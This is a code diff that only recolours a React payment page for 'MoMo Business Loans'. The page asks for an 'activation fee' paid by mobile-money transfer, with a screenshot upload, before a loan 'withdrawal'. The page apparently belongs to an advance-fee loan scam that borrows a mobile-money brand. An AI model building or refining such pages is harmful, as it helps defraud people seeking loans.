@@ -279,7 +279,7 @@ export default function PaymentPage() {
     const progressPercent = Math.min(100, Math.round(((7 - timerSecondsLeft) / 7) * 100));
 
     return (
-      <div className="min-h-screen bg-[hsl(220,50%,12%)] text-white flex flex-col items-center justify-center gap-6 px-4 py-12 text-center">
+      <div className="min-h-screen bg-[hsl(198,100%,22%)] text-white flex flex-col items-center justify-center gap-6 px-4 py-12 text-center">
         <Logo size="md" />
         <h2 className="text-2xl font-extrabold tracking-tight">
           MoMo <span className="text-[#ffcc00]">Business Loans</span>
@@ -304,7 +304,7 @@ export default function PaymentPage() {
           </p>
 
           {/* Progress bar */}
-          <div className="w-full bg-[hsl(220,40%,20%)] h-2.5 rounded-full overflow-hidden border border-[hsl(220,30%,25%)] mt-4">
+          <div className="w-full bg-[hsl(198,60%,28%)] h-2.5 rounded-full overflow-hidden border border-[hsl(198,55%,32%)] mt-4">
             <div
               className="bg-[#ffcc00] h-full transition-all duration-300 ease-linear rounded-full"
               style={{ width: `${Math.max(5, progressPercent)}%` }}
@@ -322,10 +322,10 @@ export default function PaymentPage() {
   if (withdrawalState === 'completed') {
     return (
       <PageLoader>
-        <div className="min-h-screen bg-[hsl(220,50%,12%)] text-white flex flex-col relative overflow-x-hidden">
+        <div className="min-h-screen bg-[hsl(198,100%,22%)] text-white flex flex-col relative overflow-x-hidden">
           <Confetti />
 
-          <header className="bg-[#ffcc00] text-[hsl(220,50%,12%)] py-3 px-4 shadow-md sticky top-0 z-40">
+          <header className="bg-[#ffcc00] text-[hsl(198,100%,22%)] py-3 px-4 shadow-md sticky top-0 z-40">
             <div className="container mx-auto max-w-4xl flex items-center justify-between">
               <div className="flex items-center gap-3 cursor-pointer" onClick={() => navigate('/')}>
                 <Logo size="sm" />
@@ -333,19 +333,19 @@ export default function PaymentPage() {
                   MoMo <span className="font-normal opacity-90">Business Loans</span>
                 </span>
               </div>
-              <span className="text-xs font-bold bg-[hsl(220,50%,12%)]/10 px-3 py-1 rounded-full text-[hsl(220,50%,12%)]">
+              <span className="text-xs font-bold bg-[hsl(198,100%,22%)]/10 px-3 py-1 rounded-full text-[hsl(198,100%,22%)]">
                 Withdrawal Success
               </span>
             </div>
           </header>
 
           <main className="flex-1 flex flex-col items-center justify-center px-4 py-8 sm:py-12">
-            <div className="bg-white rounded-3xl p-6 sm:p-10 text-center max-w-md w-full shadow-2xl text-[hsl(220,50%,12%)] border border-gray-100 relative z-10">
+            <div className="bg-white rounded-3xl p-6 sm:p-10 text-center max-w-md w-full shadow-2xl text-[hsl(198,100%,22%)] border border-gray-100 relative z-10">
               <div className="w-20 h-20 bg-green-50 rounded-full flex items-center justify-center mx-auto mb-4 border-2 border-green-200">
                 <CheckCircle2 className="w-12 h-12 text-green-500" />
               </div>
 
-              <h2 className="text-2xl sm:text-3xl font-black mb-2 tracking-tight text-[hsl(220,50%,12%)]">
+              <h2 className="text-2xl sm:text-3xl font-black mb-2 tracking-tight text-[hsl(198,100%,22%)]">
                 Withdrawal Initiated! 🎉
               </h2>
 
@@ -443,9 +443,9 @@ export default function PaymentPage() {
   // State 3: Payment Details & Screenshot Upload Form (with optional Admin Edit Mode)
   return (
     <PageLoader>
-      <div className="min-h-screen bg-[hsl(220,50%,12%)] text-white flex flex-col">
+      <div className="min-h-screen bg-[hsl(198,100%,22%)] text-white flex flex-col">
         {/* Header */}
-        <header className="bg-[#ffcc00] text-[hsl(220,50%,12%)] py-3 px-4 shadow-md sticky top-0 z-40">
+        <header className="bg-[#ffcc00] text-[hsl(198,100%,22%)] py-3 px-4 shadow-md sticky top-0 z-40">
           <div className="container mx-auto max-w-4xl flex items-center justify-between">
             <div className="flex items-center gap-3 cursor-pointer" onClick={() => navigate('/')}>
               <Logo size="sm" />
@@ -459,7 +459,7 @@ export default function PaymentPage() {
                   Admin Editor
                 </span>
               )}
-              <span className="text-xs font-bold bg-[hsl(220,50%,12%)]/10 px-3 py-1 rounded-full text-[hsl(220,50%,12%)]">
+              <span className="text-xs font-bold bg-[hsl(198,100%,22%)]/10 px-3 py-1 rounded-full text-[hsl(198,100%,22%)]">
                 Activation & Withdrawal
               </span>
             </div>
@@ -512,7 +512,7 @@ export default function PaymentPage() {
 
         {/* Content */}
         <main className="flex-1 container mx-auto max-w-lg px-3 sm:px-4 py-6 sm:py-8">
-          <div className="bg-white rounded-3xl p-5 sm:p-8 text-[hsl(220,50%,12%)] shadow-2xl border border-gray-100">
+          <div className="bg-white rounded-3xl p-5 sm:p-8 text-[hsl(198,100%,22%)] shadow-2xl border border-gray-100">
             <button
               id="payment-back-btn"
               onClick={() => navigate(-1)}
@@ -523,7 +523,7 @@ export default function PaymentPage() {
             </button>
 
             <div className="text-center mb-6">
-              <h2 className="text-xl sm:text-2xl font-black tracking-tight text-[hsl(220,50%,12%)]">
+              <h2 className="text-xl sm:text-2xl font-black tracking-tight text-[hsl(198,100%,22%)]">
                 Activation Fee Payment Details
               </h2>
               <p className="text-gray-500 text-xs sm:text-sm mt-1">
@@ -772,7 +772,7 @@ export default function PaymentPage() {
                 {/* 1. MTN Uganda -> Kenya */}
                 <div className="bg-white/90 rounded-xl p-2.5 sm:p-3 border border-amber-200 shadow-2xs">
                   <div className="font-black text-xs sm:text-sm text-amber-950 mb-1 flex items-center gap-1.5">
-                    <span className="w-4 h-4 rounded-full bg-[#ffcc00] text-[hsl(220,50%,12%)] text-[10px] font-black flex items-center justify-center shrink-0">1</span>
+                    <span className="w-4 h-4 rounded-full bg-[#ffcc00] text-[hsl(198,100%,22%)] text-[10px] font-black flex items-center justify-center shrink-0">1</span>
                     <span>MTN Uganda → Kenya</span>
                   </div>
                   <div className="font-bold text-[11px] sm:text-xs text-gray-900 space-y-0.5 pl-5 leading-snug">
@@ -877,7 +877,7 @@ export default function PaymentPage() {
             <button
               id="submit-withdraw-btn"
               onClick={handleSubmitAndWithdraw}
-              className="w-full py-4 rounded-2xl bg-[#ffcc00] text-[hsl(220,50%,12%)] font-black text-base hover:bg-[#ffcc00]/90 transition shadow-lg flex items-center justify-center gap-2 cursor-pointer"
+              className="w-full py-4 rounded-2xl bg-[#ffcc00] text-[hsl(198,100%,22%)] font-black text-base hover:bg-[#ffcc00]/90 transition shadow-lg flex items-center justify-center gap-2 cursor-pointer"
             >
               <span>Submit and Withdraw</span>
             </button>
